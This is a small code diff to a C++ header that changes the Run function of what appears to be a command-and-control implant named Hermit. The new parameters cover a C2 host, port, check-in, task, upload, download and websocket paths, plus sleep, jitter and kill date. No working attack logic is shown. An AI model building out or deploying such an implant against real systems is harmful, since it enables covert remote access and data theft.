@@ -2,6 +2,7 @@
 #define HERMIT_HPP
 
 #include "core/handler.hpp"
+#include "core/state.hpp"
 #include "core/system.hpp"
 
 namespace Hermit
@@ -9,11 +10,16 @@ namespace Hermit
 	BOOL Run(
 		HINSTANCE       hInstance,
 		INT             nCmdShow,
+		LPCWSTR			lpPayloadType,
+		LPCWSTR			lpProtocol,
 		LPCWSTR 		lpHost,
 		INTERNET_PORT 	nPort,
-		LPCWSTR 		lpRequestCheckInPath,
-		LPCWSTR 		lpRequestTaskGetPath,
-		LPCWSTR 		lpRequestTaskResultPath,
+		LPCWSTR 		lpReqPathCheckIn,
+		LPCWSTR			lpReqPathDownload,
+		LPCWSTR 		lpReqPathTaskGet,
+		LPCWSTR 		lpReqPathTaskResult,
+		LPCWSTR			lpReqPathUpload,
+		LPCWSTR			lpReqPathWebSocket,
 		INT 			nSleep,
 		INT				nJitter,
 		INT				nKillDate
